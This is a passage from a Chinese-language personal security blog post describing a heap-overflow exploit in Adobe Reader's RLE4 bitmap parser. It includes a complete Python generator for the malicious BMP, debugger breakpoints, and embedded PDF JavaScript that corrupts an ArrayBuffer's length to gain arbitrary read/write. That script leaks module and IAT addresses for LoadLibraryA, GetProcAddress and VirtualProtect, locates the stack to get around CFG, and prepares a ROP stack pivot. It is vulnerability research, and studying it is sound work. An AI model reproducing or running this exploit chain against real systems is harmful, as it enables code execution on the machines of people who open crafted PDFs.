class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_175:</span><br><span class="line">    sub_20E0D4B3(&amp;v120, <span class="number">17993</span>, <span class="number">0</span>);</span><br><span class="line">LABEL_176:</span><br><span class="line">    CxxThrowException(&amp;v120, &amp;_TI2_AVjfExFull__);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>从中可以分析出COMPRESSION&#x3D;2，BIT_COUNT &#x3D; 4，这样即当bitmap使用的是REL4压缩算法时，就可以到达漏洞处，接下来分析该bitmap的width和height应该为多少，才能够使得申请的堆落到ArrayBuffer对象之间的堆空洞里，在此处用windbg下断点进行调试<br><img src="https://p0.ssl.qhimg.com/t0130b808993e1892bb.png"><br>首先windbg断点，当AcroForm.api模块被加载时会断下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sxe ld:AcroForm.api</span><br></pre></td></tr></table></figure>
+<p>然后断点</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp <span class="number">0x54bcc8</span>+AcroForm_base</span><br></pre></td></tr></table></figure>
+<p>call调用的是fn_get_scanline函数，返回的是一个堆地址<br><img src="https://p2.ssl.qhimg.com/t0162f175c84f9d2973.png"></p>
+<p>我们查看这个堆的头部以及附近的内容，可以发现其前方0x144处，正是ArrayBuffer的byteLength变量，可见这里，我们堆喷成功，bitmap的解压缩数据堆成功申请到hole里<br><img src="https://p3.ssl.qhimg.com/t011f60bcb8f5f89d29.png"></p>
+<p>此时我们bitmap的WIDTH &#x3D; 0x278，HEIGHT &#x3D; 1，该bitmap的数据解压区正好申请到hole里。<br>并且通过调试，我们确定了溢出的距离为<code>-0x144</code>，无符号数也就是<code>0xfffffebc</code>,即bye_slot应该为0xfffffebc</p>
+<p><img src="https://p5.ssl.qhimg.com/t012b532259a5d8beda.png"></p>
+<p>由于这里xpos_ &gt;&gt; 1是一个有符号数的运算，因此xpos_的值应该为<code>0xfffffd78</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">0xfffffebc</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; hex &lt;&lt; (a &lt;&lt; <span class="number">1</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>而xpos是可以控制的<br><img src="https://p1.ssl.qhimg.com/t01c19e4a3df315f052.png"></p>
+<p>于是，我们可以向-0x144的位置写上4字节0xFF，使得ArrayBuffer的byteLength为0xFFFFFFFF</p>
+<p>gen_bitmap.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">RLE8 = <span class="number">1</span></span><br><span class="line">RLE4 = <span class="number">2</span></span><br><span class="line">COMPRESSION = RLE4</span><br><span class="line">BIT_COUNT = <span class="number">4</span></span><br><span class="line">CLR_USED = <span class="number">1</span> &lt;&lt; BIT_COUNT</span><br><span class="line">WIDTH = <span class="number">0x278</span></span><br><span class="line">HEIGHT = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_bitmap_file_header</span>(<span class="params">file_size, bits_offset</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&#x27;&lt;2sIHHI&#x27;</span>, <span class="string">&#x27;BM&#x27;</span>, file_size, <span class="number">0</span>, <span class="number">0</span>, bits_offset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_bitmap_info_header</span>(<span class="params">data_size</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&#x27;&lt;IIIHHIIIIII&#x27;</span>,</span><br><span class="line">        <span class="number">0x00000028</span>,</span><br><span class="line">        WIDTH,</span><br><span class="line">        HEIGHT,</span><br><span class="line">        <span class="number">0x0001</span>,</span><br><span class="line">        BIT_COUNT,</span><br><span class="line">        COMPRESSION,</span><br><span class="line">        data_size,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        CLR_USED,</span><br><span class="line">        <span class="number">0x00000000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_bitmap_info_colors</span>():</span><br><span class="line">    <span class="comment"># B, G, R, Reserved</span></span><br><span class="line">    rgb_quad = <span class="string">&#x27;\x00\x00\xFF\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> rgb_quad * CLR_USED</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_bitmap_data</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFD02</span></span><br><span class="line">    data = <span class="string">&#x27;\x00\x02\xFF\x00&#x27;</span> * (<span class="number">0xFFFFFD02</span> / <span class="number">0xFF</span>)</span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFD78</span></span><br><span class="line">    data += <span class="string">&#x27;\x00\x02\x76\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x4 bytes of 0xFF</span></span><br><span class="line">    data += <span class="string">&#x27;\x08\xFF&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># mark end of bitmap to skip CxxThrowException</span></span><br><span class="line">    data += <span class="string">&#x27;\x00\x01&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_bitmap</span>(<span class="params">filepath</span>):</span><br><span class="line">    data = get_bitmap_data()</span><br><span class="line">    data_size = <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">    bmi_header = get_bitmap_info_header(data_size)</span><br><span class="line">    bmi_colors = get_bitmap_info_colors()</span><br><span class="line"></span><br><span class="line">    bmf_header_size = <span class="number">0x0E</span></span><br><span class="line">    bits_offset = bmf_header_size + <span class="built_in">len</span>(bmi_header) + <span class="built_in">len</span>(bmi_colors)</span><br><span class="line">    file_size = bits_offset + data_size</span><br><span class="line">    bmf_header = get_bitmap_file_header(file_size, bits_offset)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bmf_header)</span><br><span class="line">        f.write(bmi_header)</span><br><span class="line">        f.write(bmi_colors)</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Usage: %s &lt;output.bmp&gt;&#x27;</span> % os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_bitmap(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
+<p>当完成了这一步的修改以后，我们就已经拥有了一个具有任意地址读写的ArrayBuffer对象了，与前面的堆喷布局同理，在pdf的xdp标签里嵌入</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;event activity=<span class="string">&quot;docReady&quot;</span> ref=<span class="string">&quot;$host&quot;</span> name=<span class="string">&quot;event__docReady&quot;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">contentType</span>=<span class="string">&quot;application/x-javascript&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/event&gt;</span><br></pre></td></tr></table></figure>
+<p>可以实现图片解析完成以后的后续操作，我们在这里，首先要查找到那个具有任意地址读写的ArrayBuffer对象，由于SpiderMonkey引擎的性质，我们可以在内存里搜索0xf0e0d0c0这个特殊数据，从而能计算出ArrayBuffer对象本身的地址，以便实现后续的读写利用</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">// 漏洞触发后，我们找到那个byteLength被修改为-1的那个ArrayBuffer，通过此ArrayBuffer，可以实现任意地址读写。</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &amp;lt; spray.<span class="property">array</span>.<span class="property">length</span>; ++i) &#123;</span><br><span class="line">   <span class="keyword">if</span> (spray.<span class="property">array</span>[i] != <span class="literal">null</span> &amp;amp;&amp;amp; spray.<span class="property">array</span>[i].<span class="property">byteLength</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">//app.alert(&quot;found idx=&quot; + i);</span></span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(spray.<span class="property">array</span>[i]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j=-<span class="number">100</span>;;j-=<span class="number">4</span>) &#123; <span class="comment">//搜索内存，查找堆地址</span></span><br><span class="line">   <span class="keyword">var</span> x = dv.<span class="title function_">getUint32</span>(j,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (x == <span class="number">0xf0e0d0c0</span>) &#123;</span><br><span class="line">   <span class="comment">//得到ArrayBuffer自身的地址</span></span><br><span class="line">   <span class="keyword">var</span> heap_addr = dv.<span class="title function_">getUint32</span>(j + <span class="number">0xC</span>,<span class="literal">true</span>) - <span class="number">0x10</span> - j;</span><br><span class="line">   <span class="comment">//app.alert(&quot;heap_addr=&quot; + heap_addr.toString(16));</span></span><br><span class="line">   <span class="comment">//得到dataview的地址</span></span><br><span class="line">   <span class="keyword">var</span> dataview_obj_addr = dv.<span class="title function_">getUint32</span>(-<span class="number">8</span>,<span class="literal">true</span>);</span><br><span class="line">   app.<span class="title function_">alert</span>(<span class="string">&quot;dataview_obj=&quot;</span> + dataview_obj_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">   <span class="comment">//得到EScript.api模块的地址</span></span><br><span class="line">   <span class="keyword">var</span> escript_base = dv.<span class="title function_">getUint32</span>(dataview_obj_addr + <span class="number">0xC</span> - heap_addr,<span class="literal">true</span>) - <span class="number">0x275510</span>;</span><br><span class="line">   <span class="comment">//app.alert(&quot;escript_base=&quot; + escript_base.toString(16));</span></span><br><span class="line">   <span class="comment">//计算三个重要的函数的iat表</span></span><br><span class="line">   <span class="keyword">var</span> <span class="title class_">LoadLibraryA</span>_iat = escript_base + <span class="number">0x1af0d8</span>;</span><br><span class="line">   <span class="keyword">var</span> <span class="title class_">GetProcAddress</span>_iat = escript_base + <span class="number">0x1af114</span>;</span><br><span class="line">   <span class="keyword">var</span> <span class="title class_">VirtualProtect</span>_iat = escript_base + <span class="number">0x1af058</span>;</span><br><span class="line">   <span class="comment">//泄露函数地址</span></span><br><span class="line">   <span class="keyword">var</span> <span class="title class_">LoadLibraryA</span> = dv.<span class="title function_">getUint32</span>(<span class="title class_">LoadLibraryA</span>_iat - heap_addr,<span class="literal">true</span>);</span><br><span class="line">   <span class="keyword">var</span> <span class="title class_">GetProcAddress</span> = dv.<span class="title function_">getUint32</span>(<span class="title class_">GetProcAddress</span>_iat - heap_addr,<span class="literal">true</span>);</span><br><span class="line">   <span class="keyword">var</span> <span class="title class_">VirtualProtect</span> = dv.<span class="title function_">getUint32</span>(<span class="title class_">VirtualProtect</span>_iat - heap_addr,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<p>接下来是劫持程序流，通过尝试发现程序开启了CFG控制流保护机制<br><img src="https://p5.ssl.qhimg.com/t01dd24c937ba1ffafd.png"><br>因此劫持虚表为gadget不可用，绕过方法有一些，这里我直接选择劫持栈做ROP。那么得泄露栈地址，在windows下泄露栈地址不太容易，得确定teb、peb的地址，而我这里盲摸索出针对当前Adobe Reader的栈地址搜索方法，即通过dataview对象里的一连串指针，偶然发现一个接近栈地址值的指针，其位置如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp = dv.<span class="title function_">getUint32</span>(dataview_obj_addr - heap_addr,<span class="literal">true</span>);</span><br><span class="line">tmp = dv.<span class="title function_">getUint32</span>(tmp - heap_addr,<span class="literal">true</span>);</span><br><span class="line">tmp = dv.<span class="title function_">getUint32</span>(tmp + <span class="number">0xC</span> - heap_addr,<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//得到一个栈地址</span></span><br><span class="line"><span class="keyword">var</span> s = dv.<span class="title function_">getUint32</span>(tmp + <span class="number">0x8</span> - heap_addr,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+<p>这里得到的s是一个栈地址，但是其地址与函数ret时的esp之间的偏移是会发生变化的，但是变化范围不大，因此可以以该地址为起点进行搜索，直到搜索到getUint32的返回地址时便可以确定具体的栈地址。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">//搜索栈地址，确定一个稳定的栈地址</span></span><br><span class="line"> <span class="keyword">var</span> stack_addr = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">var</span> k = s;k &amp;gt; s - <span class="number">0x1000</span>;k -= <span class="number">4</span>) &#123;</span><br><span class="line">		x = dv.<span class="title function_">getUint32</span>(k - heap_addr,<span class="literal">true</span>);</span><br><span class="line">		 <span class="keyword">if</span> (x == escript_base + <span class="number">0x12e384</span>) &#123;</span><br><span class="line">			stack_addr = k;</span><br><span class="line">			 <span class="comment">//app.alert(&quot;found stack_addr=&quot; + stack_addr.toString(16));</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来就利用任意地址读写，劫持ret时的esp指向的地址处为pop esp ; ret，做栈迁移，可以dv.setFloat64来完成一次性写8字节的目的，这样写完便可以完成栈迁移。</p>
+<h2 id="0x02-感想"><a href="#0x02-感想" class="headerlink" title="0x02 感想"></a>0x02 感想</h2><p>第一次挖掘真实漏洞，收获挺大</p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p>(深入分析Adobe忽略了6年的PDF漏洞) <a target="_blank" rel="noopener" href="https://xlab.tencent.com/cn/2019/09/12/deep-analysis-of-cve-2019-8014/">https://xlab.tencent.com/cn/2019/09/12/deep-analysis-of-cve-2019-8014/</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
+              <a href="/ha1vk/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="tag"># 堆溢出</a>
+              <a href="/ha1vk/tags/windows%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag"># windows漏洞利用</a>
+              <a href="/ha1vk/tags/heap-spray/" rel="tag"># heap spray</a>
+              <a href="/ha1vk/tags/Adobe/" rel="tag"># Adobe</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/10/27/bytectf2020-pwnandroid/" rel="prev" title="bytectf2020 pwnandroid">
+      <i class="fa fa-chevron-left"></i> bytectf2020 pwnandroid
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/11/23/qwb2020-final-PiAno/" rel="next" title="强网杯2020决赛RealWord的IE浏览器漏洞挖掘——PiAno(PA)">
+      强网杯2020决赛RealWord的IE浏览器漏洞挖掘——PiAno(PA) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">0x01 挖掘过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ArrayBuffer"><span class="nav-number">2.1.</span> <span class="nav-text">ArrayBuffer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E5%90%88JS%E8%BE%BE%E5%88%B0%E5%88%A9%E7%94%A8"><span class="nav-number">2.2.</span> <span class="nav-text">结合JS达到利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B2%BE%E5%87%86%E6%8E%A7%E5%88%B6%E5%86%85%E5%AD%98"><span class="nav-number">2.3.</span> <span class="nav-text">精准控制内存</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%84%9F%E6%83%B3"><span class="nav-number">3.</span> <span class="nav-text">0x02 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">0x03 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
